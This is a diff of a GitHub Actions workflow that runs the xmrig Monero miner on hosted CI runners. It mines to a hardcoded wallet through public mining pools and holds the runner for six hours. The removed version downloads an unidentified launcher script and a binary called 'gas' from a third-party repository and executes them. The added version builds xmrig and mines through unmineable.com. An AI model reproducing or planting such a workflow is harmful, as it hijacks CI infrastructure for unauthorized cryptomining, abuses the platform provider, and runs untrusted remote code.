@@ -1,20 +1,42 @@
-name: Install and Run xmrig
+name: Build and Run xmrig
 
 on:
-  workflow_dispatch:  # Allows for manual triggering of the workflow
+  workflow_dispatch:  # Manual trigger
 
 jobs:
-  run-command:
+  build-and-run:
     runs-on: ubuntu-latest
 
     steps:
       - name: Check out repository
         uses: actions/checkout@v2
 
-      - name: Install dependencies and run xmrig
+      - name: Install dependencies
         run: |
-          echo "Updating system and installing dependencies..."
-          wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
+          echo "Updating package lists and installing dependencies..."
+          apt-get update
+          apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Clone xmrig repository
+        run: |
+          echo "Cloning xmrig repository..."
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+
+      - name: Build xmrig
+        run: |
+          echo "Building xmrig..."
+          cd xmrig  # Ensure we are in the correct directory
+          mkdir build
+          cd build
+          cmake ..
+          make
+
+      - name: Run xmrig
+        run: |
+          echo "Running xmrig..."
+          cd xmrig/build  # Make sure we are in the correct build directory
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_tsjcm#mvbs-zlx7 -p x
 
       - name: Wait for 6 hours
         run: |
